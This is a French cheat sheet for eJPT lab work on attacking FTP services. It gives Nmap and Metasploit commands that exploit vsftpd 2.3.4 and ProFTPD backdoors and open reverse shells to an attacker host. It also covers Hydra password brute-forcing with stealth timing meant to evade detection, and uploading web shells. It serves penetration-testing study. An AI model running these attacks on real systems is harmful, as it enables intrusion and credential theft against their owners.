# 📁 FTP Enumeration - Scripts Nmap & Modules Metasploit

## 🔍 1. Scripts Nmap pour FTP

### Scripts de découverte FTP
| Script | Description | Usage |
|--------|-------------|-------|
| `ftp-anon` | Test de connexion anonyme | `nmap --script ftp-anon target` |
| `ftp-bounce` | Test FTP bounce attack | `nmap --script ftp-bounce target` |
| `ftp-brute` | Attaque par force brute | `nmap --script ftp-brute target` |
| `ftp-libopie` | Test vulnérabilité libopie | `nmap --script ftp-libopie target` |
| `ftp-proftpd-backdoor` | Détection backdoor ProFTPD | `nmap --script ftp-proftpd-backdoor target` |
| `ftp-syst` | Information système FTP | `nmap --script ftp-syst target` |
| `ftp-vsftpd-backdoor` | Détection backdoor vsftpd | `nmap --script ftp-vsftpd-backdoor target` |
| `ftp-vuln-cve2010-4221` | CVE-2010-4221 ProFTPD | `nmap --script ftp-vuln-cve2010-4221 target` |

### Scripts de détection de vulnérabilités
| Script | CVE | Description | Usage |
|--------|-----|-------------|-------|
| `ftp-vuln-cve2010-4221` | CVE-2010-4221 | ProFTPD Telnet IAC Buffer Overflow | `nmap --script ftp-vuln-cve2010-4221 -p 21 target` |
| `ftp-proftpd-backdoor` | - | ProFTPD 1.3.3c Backdoor | `nmap --script ftp-proftpd-backdoor -p 21 target` |
| `ftp-vsftpd-backdoor` | CVE-2011-2523 | vsftpd 2.3.4 Backdoor | `nmap --script ftp-vsftpd-backdoor -p 21 target` |

---

## 🎯 2. Commandes Nmap FTP détaillées

### Énumération complète FTP
```bash
# Scan complet FTP avec tous les scripts
nmap -p21 --script ftp-* target

# Énumération de base
nmap -p21 -sV --script ftp-anon,ftp-syst target

# Test de vulnérabilités spécifiques
nmap -p21 --script ftp-vuln-*,ftp-proftpd-backdoor,ftp-vsftpd-backdoor target

# Brute force avec wordlists
nmap -p21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt target
```

### Scripts avec arguments
| Script | Arguments | Exemple |
|--------|-----------|---------|
| `ftp-brute` | `userdb`, `passdb`, `brute.threads` | `nmap --script ftp-brute --script-args userdb=users.txt,passdb=pass.txt target` |
| `ftp-bounce` | `ftp-bounce.username`, `ftp-bounce.password` | `nmap --script ftp-bounce --script-args ftp-bounce.username=anonymous target` |
| `ftp-anon` | `ftp-anon.maxlist` | `nmap --script ftp-anon --script-args ftp-anon.maxlist=50 target` |

---

## 🛠️ 3. Modules Metasploit pour FTP

### Modules de scanning/énumération
| Module | Description | Usage |
|--------|-------------|-------|
| `auxiliary/scanner/ftp/ftp_version` | Détection de version FTP | `use auxiliary/scanner/ftp/ftp_version` |
| `auxiliary/scanner/ftp/anonymous` | Test connexion anonyme | `use auxiliary/scanner/ftp/anonymous` |
| `auxiliary/scanner/ftp/ftp_login` | Brute force FTP | `use auxiliary/scanner/ftp/ftp_login` |
| `auxiliary/scanner/ftp/bison_ftp_traversal` | Directory traversal Bison FTP | `use auxiliary/scanner/ftp/bison_ftp_traversal` |

### Modules d'exploitation
| Module | CVE | Cible | Description |
|--------|-----|-------|-------------|
| `exploit/unix/ftp/vsftpd_234_backdoor` | CVE-2011-2523 | vsftpd 2.3.4 | Backdoor command execution |
| `exploit/unix/ftp/proftpd_modcopy_exec` | CVE-2015-3306 | ProFTPD 1.3.5 | Module mod_copy arbitrary file copy |
| `exploit/unix/ftp/proftpd_telnet_iac` | CVE-2010-4221 | ProFTPD | Telnet IAC buffer overflow |
| `exploit/linux/ftp/proftp_sreplace` | CVE-2006-5815 | ProFTPD 1.2 | sreplace buffer overflow |

---

## 🔧 4. Workflow complet avec Metasploit

### Configuration de base
```bash
msfconsole -q
workspace -a ftp_enum
setg RHOSTS target_ip
```

### Séquence d'énumération FTP
```bash
# 1. Détection de version
use auxiliary/scanner/ftp/ftp_version
set RHOSTS target
run

# 2. Test connexion anonyme
use auxiliary/scanner/ftp/anonymous
set RHOSTS target
run

# 3. Si anonyme échoue, brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS target
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set VERBOSE true
run
```

---

## ⚔️ 5. Exploitation selon version détectée

### vsftpd 2.3.4 (Backdoor)
```bash
# Détection
nmap --script ftp-vsftpd-backdoor -p 21 target

# Exploitation avec Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target
set LHOST attacker_ip
exploit
```

### ProFTPD 1.3.5 (mod_copy)
```bash
# Détection
nmap -sV -p 21 target | grep "ProFTPD 1.3.5"

# Exploitation
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS target
set LHOST attacker_ip
set LPORT 4444
exploit
```

### ProFTPD Telnet IAC (CVE-2010-4221)
```bash
# Détection
nmap --script ftp-vuln-cve2010-4221 -p 21 target

# Exploitation
use exploit/unix/ftp/proftpd_telnet_iac
set RHOSTS target
set LHOST attacker_ip
exploit
```

---

## 🔍 6. Énumération manuelle FTP

### Connexion et commandes de base
```bash
# Connexion standard
ftp target
# Ou avec timeout
timeout 10 ftp target

# Connexion anonyme
ftp target
# Username: anonymous
# Password: anonymous ou email

# Commandes FTP utiles
help                    # Liste des commandes
syst                    # Information système
pwd                     # Répertoire actuel
ls / dir                # Lister fichiers
cd <directory>          # Changer répertoire
get <filename>          # Télécharger fichier
mget *                  # Télécharger tous les fichiers
put <filename>          # Uploader fichier (si autorisé)
```

### Tests manuels importants
```bash
# Test upload
echo "test" > test.txt
put test.txt

# Test directory traversal
cd ..
cd ../../../etc

# Test de permissions
mkdir test_dir
rmdir test_dir

# Banner grabbing manuel
nc target 21
```

---

## 📋 7. Scripts personnalisés et automation

### Script Bash pour énumération FTP
```bash
#!/bin/bash
TARGET=$1

echo "[+] FTP Enumeration for $TARGET"

echo "[*] Nmap version detection..."
nmap -p21 -sV $TARGET

echo "[*] Testing anonymous login..."
nmap --script ftp-anon -p21 $TARGET

echo "[*] Testing for backdoors..."
nmap --script ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p21 $TARGET

echo "[*] Testing vulnerabilities..."
nmap --script ftp-vuln-* -p21 $TARGET

echo "[*] Manual anonymous test..."
timeout 5 bash -c "echo -e 'anonymous\nanonymous\nls\nquit' | ftp $TARGET"
```

### One-liner pour test rapide
```bash
# Test complet FTP
nmap -p21 -sV --script ftp-anon,ftp-vsftpd-backdoor,ftp-proftpd-backdoor,ftp-vuln-* target && echo -e "anonymous\nanonymous\nls\nquit" | timeout 10 ftp target
```

---

## 🎯 8. Cas d'usage spécifiques eJPT

### Scénario 1: Découverte FTP anonyme
```bash
# 1. Scanner avec Nmap
nmap -p21 --script ftp-anon target

# 2. Si anonyme autorisé, se connecter
ftp target
# anonymous / anonymous

# 3. Explorer et télécharger
ls -la
cd pub
get interesting_file.txt
```

### Scénario 2: FTP avec credentials faibles
```bash
# 1. Brute force avec Metasploit
use auxiliary/scanner/ftp/ftp_login
set RHOSTS target
set USER_FILE /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# 2. Si credentials trouvés, se connecter
ftp target
# user:password

# 3. Test d'upload (pour web shells)
put shell.php
```

### Scénario 3: Exploitation vsftpd backdoor
```bash
# 1. Détecter version
nmap -sV -p21 target

# 2. Test backdoor si vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS target
set LHOST attacker_ip
exploit

# 3. Si shell obtenu
whoami
uname -a
```

---

## 🚨 9. Indicateurs de vulnérabilités FTP

### Versions vulnérables communes
| Version | Vulnérabilité | Module Metasploit |
|---------|---------------|-------------------|
| **vsftpd 2.3.4** | Backdoor | `exploit/unix/ftp/vsftpd_234_backdoor` |
| **ProFTPD 1.3.5** | mod_copy RCE | `exploit/unix/ftp/proftpd_modcopy_exec` |
| **ProFTPD < 1.3.3c** | Backdoor | `ftp-proftpd-backdoor` script |
| **ProFTPD 1.2.x** | Buffer overflow | `exploit/linux/ftp/proftp_sreplace` |

### Signes de misconfiguration
- **Anonymous login autorisé** avec écriture
- **Upload autorisé** dans répertoire web
- **Directory traversal** possible
- **Credentials faibles** (admin:admin, ftp:ftp)
- **Bannière informative** révélant version exacte

---

## 🔧 10. Configuration Metasploit avancée

### Options importantes pour modules FTP
```bash
# Pour ftp_login
set BLANK_PASSWORDS true        # Tester mots de passe vides
set USER_AS_PASS true          # Utiliser username comme password
set VERBOSE true               # Affichage détaillé
set THREADS 10                 # Parallélisation

# Pour ftp_version
set TIMEOUT 10                 # Timeout connexion
```

### Utilisation avec base de données
```bash
# Sauvegarder résultats
db_nmap -p21 -sV --script ftp-* target

# Voir les services FTP trouvés
services -p 21

# Voir les vulnérabilités
vulns
```

---

## 📝 11. Wordlists utiles pour FTP

### Wordlists utilisateurs FTP
```bash
# Metasploit
/usr/share/metasploit-framework/data/wordlists/common_users.txt

# SecLists
/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt

# Utilisateurs FTP courants
admin, ftp, anonymous, user, test, guest, demo
```

### Wordlists mots de passe FTP
```bash
# Passwords courants FTP
/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt

# RockYou
/usr/share/wordlists/rockyou.txt

# Mots de passe FTP typiques
ftp, admin, password, 123456, anonymous, guest
```

---

## 💀 13. Brute Force FTP avec Hydra

### Syntaxe générale Hydra
```bash
hydra [OPTIONS] <target> <service>
```

### Options essentielles Hydra
| Option | Description | Exemple |
|--------|-------------|---------|
| `-l <user>` | Utilisateur unique | `-l admin` |
| `-L <file>` | Liste d'utilisateurs | `-L users.txt` |
| `-p <pass>` | Mot de passe unique | `-p password123` |
| `-P <file>` | Liste de mots de passe | `-P passwords.txt` |
| `-t <threads>` | Nombre de threads | `-t 16` |
| `-f` | Arrêter après premier succès | `-f` |
| `-v` | Mode verbose | `-v` |
| `-V` | Très verbose (affiche tentatives) | `-V` |
| `-s <port>` | Port spécifique | `-s 2121` |
| `-o <file>` | Fichier de sortie | `-o ftp_results.txt` |

### Exemples de brute force FTP avec Hydra

#### 1. Brute force utilisateur unique, liste de mots de passe
```bash
# Test de mots de passe pour un utilisateur spécifique
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target

# Avec options avancées
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 16 -f -v ftp://target
```

**Explication des options :**
- `-l admin` : Teste uniquement l'utilisateur "admin"
- `-P rockyou.txt` : Utilise la wordlist rockyou pour les mots de passe
- `-t 16` : Utilise 16 threads parallèles (plus rapide)
- `-f` : S'arrête dès qu'un mot de passe valide est trouvé
- `-v` : Affiche les informations de progression

#### 2. Brute force liste d'utilisateurs, liste de mots de passe
```bash
# Test complet avec listes d'utilisateurs et mots de passe
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt \
      -t 16 -f -V ftp://target
```

**Explication :**
- `-L users.txt` : Liste d'utilisateurs courants
- `-P passwords.txt` : Liste de mots de passe courants
- `-V` : Mode très verbose, affiche chaque tentative
- `ftp://target` : Spécifie le service FTP sur la cible

#### 3. Brute force avec utilisateur anonyme
```bash
# Test spécifique pour anonymous
hydra -l anonymous -P passwords.txt ftp://target

# Test avec mots de passe vides/courants
hydra -l anonymous -p "" ftp://target
hydra -l anonymous -p anonymous ftp://target
hydra -l anonymous -p ftp ftp://target
```

#### 4. Brute force avec port personnalisé
```bash
# FTP sur port non-standard
hydra -l admin -P rockyou.txt -s 2121 ftp://target

# Ou avec la syntaxe alternative
hydra -l admin -P rockyou.txt ftp://target:2121
```

#### 5. Options de performance et stealth
```bash
# Attaque lente pour éviter détection
hydra -l admin -P passwords.txt -t 1 -w 3 ftp://target

# Attaque rapide (attention aux IDS/IPS)
hydra -l admin -P passwords.txt -t 64 -f ftp://target
```

**Explication options avancées :**
- `-w 3` : Délai de 3 secondes entre tentatives
- `-t 1` : Un seul thread (plus discret)
- `-t 64` : 64 threads (très rapide mais bruyant)

### Wordlists recommandées pour FTP

#### Utilisateurs FTP courants (créer users_ftp.txt)
```bash
# Créer liste d'utilisateurs FTP
cat > users_ftp.txt << EOF
admin
administrator
root
ftp
anonymous
user
test
guest
demo
backup
service
operator
EOF
```

#### Mots de passe FTP courants (créer passwords_ftp.txt)
```bash
# Créer liste de mots de passe FTP
cat > passwords_ftp.txt << EOF
admin
password
123456
ftp
anonymous
admin123
root
guest
test
demo
backup
service
password123
admin321
EOF
```

### Exemples complets avec wordlists personnalisées

#### Brute force rapide avec wordlists courtes
```bash
# Test rapide avec credentials courants
hydra -L users_ftp.txt -P passwords_ftp.txt -t 16 -f -o ftp_creds.txt ftp://target

# Vérifier les résultats
cat ftp_creds.txt
```

#### Brute force exhaustif
```bash
# Test exhaustif avec grandes wordlists
hydra -L /usr/share/seclists/Usernames/Names/names.txt \
      -P /usr/share/wordlists/rockyou.txt \
      -t 32 -f -v -o ftp_results.txt ftp://target

# Sauvegarder dans un fichier de log
hydra -L users.txt -P passwords.txt -t 16 -f -V ftp://target | tee hydra_ftp.log
```

### Combinaison Hydra + Scripts post-découverte

```bash
#!/bin/bash
TARGET=$1

echo "[+] Starting FTP brute force on $TARGET"

# 1. Test anonymous d'abord
echo "[*] Testing anonymous access..."
hydra -l anonymous -p "" -t 1 ftp://$TARGET

# 2. Test credentials courants
echo "[*] Testing common credentials..."
hydra -L users_ftp.txt -P passwords_ftp.txt -t 16 -f -v ftp://$TARGET

# 3. Si échec, brute force plus approfondi
echo "[*] Extended brute force..."
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt \
      -t 16 -f -V ftp://$TARGET

echo "[+] Brute force completed"
```

### Comparaison Hydra vs Metasploit FTP brute force

| Aspect | Hydra | Metasploit |
|--------|--------|------------|
| **Vitesse** | Très rapide | Plus lent |
| **Flexibilité** | Wordlists custom faciles | Wordlists intégrées |
| **Output** | Format texte simple | Intégration base MSF |
| **Stealth** | Options de timing | Moins d'options |
| **Simplicité** | Commande directe | Setup module requis |

### Hydra avec options de stealth
```bash
# Mode furtif (éviter détection)
hydra -l admin -P passwords.txt -t 1 -w 5 -f ftp://target

# Mode normal
hydra -l admin -P passwords.txt -t 8 -f ftp://target

# Mode agressif (attention aux logs)
hydra -l admin -P passwords.txt -t 32 -f ftp://target
```

**Explications timing :**
- `-t 1 -w 5` : 1 thread, 5 sec entre tentatives (furtif)
- `-t 8` : 8 threads (équilibré) 
- `-t 32` : 32 threads (rapide mais détectable)

### Traitement des résultats Hydra
```bash
# Hydra avec sortie formatée
hydra -L users.txt -P passwords.txt -t 16 -f -o ftp_success.txt ftp://target

# Parser les résultats
grep "login:" ftp_success.txt | cut -d' ' -f5,7

# Tester la connexion trouvée
USER=$(grep "login:" ftp_success.txt | cut -d' ' -f5)
PASS=$(grep "login:" ftp_success.txt | cut -d' ' -f7)
echo "Found: $USER:$PASS"

# Se connecter automatiquement
echo -e "$USER\n$PASS\nls\nquit" | ftp target
```

### One-liner Hydra pour tests rapides FTP
```bash
# Test ultra-rapide anonymous + admin
hydra -l anonymous -p "" ftp://target && hydra -l admin -p admin ftp://target

# Test credentials courants en one-shot
hydra -L <(echo -e "admin\nftp\nroot\nanonymous") -P <(echo -e "admin\npassword\nftp\nanonymous\n123456") -t 16 -f ftp://target
```

---

### Workflow FTP recommandé
1. **Detection** : `nmap -p21 -sV target`
2. **Anonymous test** : `nmap --script ftp-anon target`
3. **Vulnerability scan** : `nmap --script ftp-vuln-* target`
4. **Si vulnérable** : Exploitation avec Metasploit
5. **Si non vulnérable** : Brute force credentials

### Points d'attention FTP
- **Toujours tester anonymous** : Très fréquent dans eJPT
- **Vérifier version exacte** : Vulnérabilités spécifiques
- **Tester upload** : Pour shells web si couplé avec HTTP
- **Directory traversal** : Accès à fichiers système
- **Banner grabbing** : Révèle souvent version précise

### Erreurs courantes à éviter
- Ne pas tester **anonymous:anonymous** ET **anonymous:**
- Oublier de tester l'**upload** après connexion réussie
- Ne pas vérifier si FTP partage répertoire avec **serveur web**
- Ignorer les **anciennes versions** de ProFTPD/vsftpd

**🎯 Conseil final eJPT :** Le FTP dans l'eJPT suit souvent ce pattern : détection → test anonymous → si échec, brute force → si version vulnérable, exploitation directe. L'anonymous login est très fréquent dans les labs !